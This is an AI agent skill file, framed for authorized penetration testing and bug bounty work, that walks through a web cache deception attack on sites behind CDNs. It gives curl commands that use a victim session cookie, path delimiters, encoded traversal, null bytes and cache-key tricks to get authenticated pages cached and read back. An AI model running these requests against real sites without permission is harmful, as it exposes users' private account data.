---
name: performing-web-cache-deception-attack
description: "Executes web cache deception via path normalization. Signals: web vulnerabilities, injection, SQL injection."
zh-signals: "Executes web cache deception attacks by exploiting path normalization 信号:web漏洞,注入,sql注入。"
when-to-use: Executes web cache deception attacks by exploiting path normalization
  discrepancies between CDN/reverse-proxy caching layers (Cloudflare, Akamai, Varnish,
  Nginx) and origin servers to cache and retrieve sensitive authenticated content.
  Use when testing applications behind CDNs for cache-key misconfigurations, during
  bug bounty hunting on aggressively cached sites, or when assessing sensitive data
  exposure through cache layer misconfiguration.
domain: cybersecurity
subdomain: web-application-security
tags:
- web-cache-deception
- cdn-attack
- cache-poisoning
- path-normalization
- cloudflare
- cache-key
- static-resource
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
mitre_attack:
- T1190
- T1059.007
- T1505.003
- T1083
- T1078.004
---

# Performing Web Cache Deception Attack

## When to Use
- When testing applications behind CDNs or reverse proxies (Cloudflare, Akamai, Varnish, Nginx)
- During assessment of authenticated page caching behavior
- When evaluating path normalization differences between caching and origin layers
- During bug bounty hunting on applications with aggressive caching policies
- When testing for sensitive data exposure through cache layer misconfiguration

## Prerequisites
- Understanding of HTTP caching mechanisms (Cache-Control, Vary, Age headers)
- Knowledge of CDN path normalization and cache key construction
- Burp Suite for intercepting and crafting requests
- Two browser sessions (authenticated victim and unauthenticated attacker)
- Understanding of URL path parsing differences across technologies
- Familiarity with common CDN platforms (Cloudflare, Akamai, Fastly, AWS CloudFront)


> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## Workflow

### Step 1 — Identify Caching Layer and Behavior
```bash
# Determine if a caching layer exists
curl -I http://target.com/account/profile
# Look for: X-Cache, CF-Cache-Status, Age, Via, X-Varnish headers

# Check caching rules for static extensions
curl -I "http://target.com/static/style.css"
# Look for: X-Cache: HIT, CF-Cache-Status: HIT, Age: >0

# Identify which extensions are cached
for ext in css js png jpg gif svg ico woff woff2 pdf; do
  echo -n "$ext: "
  curl -sI "http://target.com/test.$ext" | grep -i "x-cache\|cf-cache"
done
```

### Step 2 — Test Path-Based Cache Deception
```bash
# Classic web cache deception: append static extension to dynamic URL
# Victim visits: http://target.com/account/profile/nonexistent.css
# If origin returns profile page and CDN caches it based on .css extension:

# Step 1: As victim (authenticated), visit:
curl -b "session=VICTIM_SESSION" "http://target.com/account/profile/anything.css"

# Step 2: As attacker (unauthenticated), request same URL:
curl "http://target.com/account/profile/anything.css"
# If victim's profile data is returned, cache deception is confirmed

# Test various extensions
for ext in css js png jpg svg ico woff2; do
  curl -b "session=VICTIM_SESSION" "http://target.com/account/profile/x.$ext" -o /dev/null
  sleep 2
  echo -n "$ext: "
  curl -s "http://target.com/account/profile/x.$ext" | head -c 200
  echo
done
```

### Step 3 — Exploit Delimiter-Based Discrepancies
```bash
# Use path delimiters that CDN and origin interpret differently
# Semicolon delimiter (ignored by CDN, processed by origin)
curl -b "session=VICTIM" "http://target.com/account/profile;anything.css"

# Encoded characters
curl -b "session=VICTIM" "http://target.com/account/profile%2Fstatic.css"
curl -b "session=VICTIM" "http://target.com/account/profile%3Bstyle.css"

# Null byte injection
curl -b "session=VICTIM" "http://target.com/account/profile%00.css"

# Fragment identifier abuse
curl -b "session=VICTIM" "http://target.com/account/profile%23.css"

# Dot segment normalization
curl -b "session=VICTIM" "http://target.com/static/..%2Faccount/profile"
```

### Step 4 — Test Normalization Discrepancies
```bash
# Path traversal normalization differences
# CDN normalizes: /account/profile/../static/x.css -> /static/x.css (cached)
# Origin sees: /account/profile (dynamic page returned)

curl -b "session=VICTIM" "http://target.com/static/../account/profile"
# CDN may cache as /account/profile if it normalizes differently than origin

# Encoded path traversal
curl -b "session=VICTIM" "http://target.com/static/..%2faccount/profile"

# Case sensitivity differences
curl -b "session=VICTIM" "http://target.com/account/profile/X.CSS"

# Double-encoded paths
curl -b "session=VICTIM" "http://target.com/account/profile/%252e%252e/static.css"
```

### Step 5 — Exploit Cache Key Manipulation
```bash
# Identify cache key components
# CDN may use: scheme + host + path (excluding query string)
# Test if query string affects caching

curl -b "session=VICTIM" "http://target.com/account/profile?cachebuster=123.css"

# Test if the CDN uses the full path or normalized path as cache key
curl -b "session=VICTIM" "http://target.com/account/profile/./style.css"
curl "http://target.com/account/profile/./style.css"  # Check if cached

> 📎 Detailed content (full examples / references / data tables) has been split into `reference.md` in the same directory; use Read to load the relevant section on demand.
